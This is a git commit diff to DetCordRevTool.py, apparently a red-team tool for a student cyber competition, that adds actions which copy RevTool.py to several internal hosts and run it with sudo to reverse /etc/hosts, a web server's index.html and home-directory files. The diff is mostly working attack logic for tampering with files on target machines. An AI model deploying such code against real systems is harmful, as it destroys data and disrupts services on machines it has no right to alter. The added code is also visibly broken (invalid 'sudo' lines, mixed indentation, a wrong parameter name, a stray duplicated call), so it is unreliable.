b55544366a254f21d4a961f5cddbaa209ef9e990
LittleHack3r <sxm6549@rit.edu>
2019-04-20 14:41:54 -0400

    All actions created

--- DetCordRevTool.py
+++ DetCordRevTool.py
@@ -13,7 +13,7 @@ env['hosts'] = [ "10.2.11.2", "10.3.11.1", "10.3.11.3", "10.3.11.4"]
 env['threading'] = True  # threading defaults to false
 
 @action
-def deployRevTool(host):
+def allRev(host):
     print("Deploying revtool")
     sudo = host.user != "root"
     try:
@@ -31,3 +31,46 @@ def deployRevTool(host):
 
     except PermissionError as _:
         print("Cannot deploy revtool")
+
+@action
+def hostRev(host):
+	print("Deploying revTool etc/hosts")
+	sudo host.user != "root"
+	try:
+	    #Put the file onto the host
+        host.put("RevTool.py", "/tmp/RevTool.py")
+        # Reverse their /etc/hosts file
+        ret = host.run("python3 /tmp/RevTool.py /etc/hosts", sudo=sudo)
+        display(ret)
+
+    except PermissionError as _:
+        print("Cannot deploy revtool")
+
+@action
+def spefRev(host):
+    print("Deploying revTool etc/hosts")
+	sudo host.user != "root"
+	try:
+	    #Put the file onto the host
+        host.put("RevTool.py", "/tmp/RevTool.py")
+        # Reverse specific
+        ret = host.run("python3 /tmp/RevTool.py /var/www/html/index.html", sudo=sudo)
+        display(ret)
+
+    except PermissionError as _:
+        print("Cannot deploy revtool")
+
+@action
+def homeRev(hosts):
+    print("Deploying revTool etc/hosts") # Reverse all scripts in the home directory
+	sudo host.user != "root"
+	try:
+	    #Put the file onto the host
+        host.put("RevTool.py", "/tmp/RevTool.py")
+        # Reverse their home dir files
+        ret = host.run("python3 /tmp/RevTool.py", sudo=sudo)
+        display(ret)
+
+    except PermissionError as _:
+        print("Cannot deploy revtool")
+        ret = host.run("python3 /tmp/RevTool.py /etc/hosts", sudo=sudo)
